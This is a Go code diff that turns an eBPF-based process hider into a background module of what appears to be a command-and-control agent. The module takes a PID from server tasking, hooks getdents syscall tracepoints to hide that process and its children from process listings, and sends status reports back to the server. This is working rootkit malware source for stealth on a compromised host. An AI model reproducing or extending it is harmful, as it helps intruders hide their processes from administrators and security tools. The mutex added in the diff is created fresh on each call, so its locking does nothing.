@@ -10,6 +10,7 @@ import (
 	"log"
 	"os"
 	"os/signal"
+	"sync"
 	"slices"
 	"strconv"
 	"strings"
@@ -34,30 +35,99 @@ type event struct {
 	_       [3]byte // C struct alignment
 }
 
+type Worker struct {
+	cancel context.CancelFunc
+	done chan struct{}
+}
+
+type SafeCounter struct {
+	mu sync.Mutex
+}
+
 var (
 	pidsHidden = []int{}
 )
 
+func (w *Worker) Stop() {
+	w.cancel()
+	<-w.done
+}
+
+func argsToPids(args string) (int, int, error) {
+	argsParts := strings.Fields(args)
+	if len(argsParts) != 2 {
+		return 0, 0, fmt.Errorf("invalid args: %s", args)
+	}
+
+	pid, err := strconv.Atoi(argsParts[0])
+	if err != nil {
+		return 0, 0, fmt.Errorf("invalid PID: %s, error: %v", args, err)
+	}
+	targetPPID, err := strconv.Atoi(argsParts[1])
+	if err != nil {
+		return 0, 0, fmt.Errorf("invalid PPID: %s, error: %v", args, err)
+	}
+
+	if slices.Contains(pidsHidden, pid) {
+		return 0, 0, fmt.Errorf("pid %s is already hidden", args)
+	}
+	return pid, targetPPID, nil
+}
+
+func startWorker(ctx context.Context, reader *ringbuf.Reader, cleanup func()) *Worker {
+    ctx, cancel := context.WithCancel(ctx)
+
+    w := &Worker{
+        cancel: cancel,
+        done:   make(chan struct{}),
+    }
+
+    go func() {
+        defer close(w.done)
+        defer cleanup()
+
+        go func() {
+            <-ctx.Done()
+            reader.Close()
+        }()
+
+        for {
+            record, err := reader.Read()
+            if err != nil {
+                if ctx.Err() != nil {
+                    return
+                }
+
+                log.Printf("ringbuf read: %v", err)
+                continue
+            }
+
+            var e event
+            if err := binary.Read(
+                bytes.NewReader(record.RawSample),
+                binary.LittleEndian,
+                &e,
+            ); err != nil {
+                log.Printf("decode event: %v", err)
+                continue
+            }
+
+            comm := strings.TrimRight(string(e.Comm[:]), "\x00")
+            log.Printf("pid=%d comm=%s success=%t",
+                e.Pid, comm, e.Success != 0)
+        }
+    }()
+
+    return w
+}
+
+// args come in as pid (to hide) and ppid (to hide all children of that pid) space separated.
 func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 	args := strings.TrimSpace(strings.ToLower(taskData["args"].(string)))
 
-	argsSplit := strings.Split(args, " ")
-
-
-	pid, err := strconv.Atoi(argsSplit[0])
+	pid, targetPPID, err := argsToPids(args)
 	if err != nil {
-		DataShipper(serverUrl, taskData, fmt.Sprintf("invalid PID: %s", args))
-		return
-	}
-	targetPPID, err := strconv.Atoi(argsSplit[1])
-	if err != nil {
-		DataShipper(serverUrl, taskData, fmt.Sprintf("invalid PPID: %s", args))
-	}
-
-
-
-	if slices.Contains(pidsHidden, pid) {
-		DataShipper(serverUrl, taskData, fmt.Sprintf("pid %s is already hidden", args))
+		DataShipper(serverUrl, taskData, fmt.Sprintf("%v", err))
 		return
 	}
 
@@ -65,7 +135,8 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		Older kernels may account BPF objects against RLIMIT_MEMLOCK.
 	*/
 	if err := rlimit.RemoveMemlock(); err != nil {
-		log.Fatalf("remove memlock: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("remove memlock: %v", err))
+		return
 	}
 
 	/*
@@ -75,7 +146,8 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 	*/
 	spec, err := loadBpf()
 	if err != nil {
-		log.Fatalf("load BPF spec: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("load BPF spec: %v", err))
+		return
 	}
 
 	/*
@@ -89,26 +161,30 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 	pidString := strconv.Itoa(pid)
 
 	if len(pidString)+1 > maxPIDLen {
-		log.Fatal("PID string too large")
+		DataShipper(serverUrl, taskData, fmt.Sprintf("pid string too large: %d", len(pidString)+1))
+		return
 	}
 
 	var pidBuffer [maxPIDLen]byte
 	copy(pidBuffer[:], pidString)
 
 	if err := spec.Variables["pid_to_hide"].Set(pidBuffer); err != nil {
-		log.Fatalf("set pid_to_hide: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("set pid_to_hide: %v", err))
+		return
 	}
 
 	if err := spec.Variables["pid_to_hide_len"].Set(
 		int32(len(pidString) + 1),
 	); err != nil {
-		log.Fatalf("set pid_to_hide_len: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("set pid_to_hide_len: %v", err))
+		return
 	}
 
 	if err := spec.Variables["target_ppid"].Set(
 		int32(targetPPID),
 	); err != nil {
-		log.Fatalf("set target_ppid: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("set target_ppid: %v", err))
+		return
 	}
 
 	/*
@@ -119,9 +195,9 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 	var objs bpfObjects
 
 	if err := spec.LoadAndAssign(&objs, nil); err != nil {
-		log.Fatalf("load BPF objects: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("load BPF objects: %v", err))
+		return
 	}
-	defer objs.Close()
 
 	/*
 		Populate the program-array map.
@@ -137,14 +213,16 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		uint32(prog01),
 		uint32(objs.HandleGetdentsExit.FD()),
 	); err != nil {
-		log.Fatalf("install tail call 1: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("install tail call 1: %v", err))
+		return
 	}
 
 	if err := objs.MapProgArray.Put(
 		uint32(prog02),
 		uint32(objs.HandleGetdentsPatch.FD()),
 	); err != nil {
-		log.Fatalf("install tail call 2: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("install tail call 2: %v", err))
+		return
 	}
 
 	/*
@@ -157,9 +235,9 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		nil,
 	)
 	if err != nil {
-		log.Fatalf("attach enter tracepoint: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("attach enter tracepoint: %v", err))
+		return
 	}
-	defer enterLink.Close()
 
 	/*
 		Attach syscall EXIT.
@@ -174,9 +252,9 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		nil,
 	)
 	if err != nil {
-		log.Fatalf("attach exit tracepoint: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("attach exit tracepoint: %v", err))
+		return
 	}
-	defer exitLink.Close()
 
 	/*
 		Ring-buffer reader.
@@ -186,56 +264,22 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 	*/
 	reader, err := ringbuf.NewReader(objs.Rb)
 	if err != nil {
-		log.Fatalf("open ring buffer: %v", err)
+		DataShipper(serverUrl, taskData, fmt.Sprintf("open ring buffer: %v", err))
+		return
 	}
-	defer reader.Close()
 
-	ctx, cancel := signal.NotifyContext(
-		context.Background(),
-		os.Interrupt,
-		syscall.SIGTERM,
+	// at this point the pid is hidden 
+	var c = SafeCounter{}
+	c.mu.Lock()
+	pidsHidden = append(pidsHidden, pid)
+	c.mu.Unlock()
+
+	worker := startWorker(agentCtx, reader,
+		func() {
+			reader.Close()
+			exitLink.Close()
+			enterLink.Close()
+			objs.Close()
+		},
 	)
-	defer cancel()
-
-	go func() {
-		<-ctx.Done()
-		reader.Close()
-	}()
-
-	fmt.Printf("Loaded lesson 24 BPF program for PID %d\n", pid)
-
-	for {
-		record, err := reader.Read()
-		if err != nil {
-			if ctx.Err() != nil {
-				break
-			}
-
-			log.Printf("ringbuf read: %v", err)
-			continue
-		}
-
-		var e event
-
-		if err := binary.Read(
-			bytes.NewReader(record.RawSample),
-			binary.LittleEndian,
-			&e,
-		); err != nil {
-			log.Printf("decode event: %v", err)
-			continue
-		}
-
-		comm := strings.TrimRight(
-			string(e.Comm[:]),
-			"\x00",
-		)
-
-		fmt.Printf(
-			"pid=%d comm=%s success=%t\n",
-			e.Pid,
-			comm,
-			e.Success != 0,
-		)
-	}
 }
